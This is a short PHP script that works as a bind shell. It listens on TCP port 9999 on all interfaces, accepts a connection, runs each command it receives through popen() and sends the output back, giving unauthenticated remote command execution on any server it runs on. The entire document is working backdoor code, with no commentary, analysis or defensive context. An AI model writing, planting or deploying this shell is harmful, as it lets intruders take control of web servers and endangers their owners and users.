<?php
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_bind($socket, '0.0.0.0', 9999);
        socket_listen($socket, 1);
        $conn = socket_accept($socket);
        while(true) {
                if (!socket_write($conn, "$ ", 2)) exit;
                $buf = socket_read($conn, 100);
                $cmd = popen("$buf", "r");
                while (!feof($cmd)){
                        $msg = fgetc($cmd);
                        socket_write($conn, $msg, strlen($msg));
                }
        }
?>

